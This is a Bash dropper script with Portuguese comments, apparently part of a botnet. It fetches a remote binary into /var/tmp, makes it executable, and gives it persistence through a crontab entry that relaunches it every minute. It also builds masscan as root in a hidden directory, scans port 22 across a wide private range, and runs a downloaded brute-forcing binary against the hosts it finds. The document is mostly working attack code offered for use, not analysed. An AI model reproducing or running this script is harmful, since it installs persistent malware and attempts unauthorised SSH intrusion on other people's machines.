#ATILA_VKZMN

#esse script executara varias acoes   elas serao inplemetadas  

#nem todas agora ok so as mais importantes por agora ok

url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
url_masscan='https://github.com/robertdavidgraham/masscan/archive/refs/tags/1.3.2.tar.gz'



wget_ok=0
masscan_ok=0



cron() {

cron_out=$( crontab -l )
if  echo  "$cron_out" | grep -q atila  ; then 
echo tem
else
echo nao tem
#download of atila and add in crontab 
command -v wget
if (( $? )) ; then
wget_ok=0
else
wget_ok=1
fi;

if [ $wget_ok -eq 1 ] ; then
wget $url -O /var/tmp/atila
cd /var/tmp ; chmod 777 atila
(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
else
curl  -L  $url -o /var/tmp/atila
cd /var/tmp ; chmod 777 atila
(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -

fi;

fi;

}


##################



brute(){


cd /var/tmp  ; cd .brute

wget $brute_url -O brute || curl  -L $brute_url -o brute

chmod 777 brute && chmod 777 masscan

timeout   5s ./masscan -p 22   192.168.1.1/10 > ip  #50 segundos para  pega os ips

awk '{print $6 }' ip   > ips

timeout   5s    ./brute  #50 segundos para  testa o   ip


return

}


#################################

install_mass(){


#function no critical


cd /var/tmp 

out_cat=$(cat .brute/masscan )

if (( ! $?  )) ; then #masscan ja foi instalado

brute

return


fi ; 








if [ $EUID -eq  0 ] ; then


apt upgrade  -y  


apt-get install -y libcap-dev #masscan depedencia



command -v make 
if (( $? )) ; then 
apt-get  install -y make #install make compile
fi;


wget $url_masscan  -O /tmp/mass.gz   || curl  -L  $url_masscan  -o    /tmp/mass.gz


cd /tmp ; tar -xf mass.gz  ; cd masscan-1.3.2  ; make  ; cd  bin 

 

md5=$( md5sum masscan )

for m in $md5 ; do

#verify md5 of masscan


if [ $m = '97615c0b05d680ac2f39eb7abca0da57' ] ; then

  masscan_ok=1

  
fi ;

done

fi;



if [ $masscan_ok -eq 1 ] ; then


mkdir -p /var/tmp/.brute
cp masscan  /var/tmp/.brute/masscan
cd /var/tmp ; cd .brute


brute



fi ;

}




##################

init() {

 
while true ; do
install_mass 
done



#cron



}



init




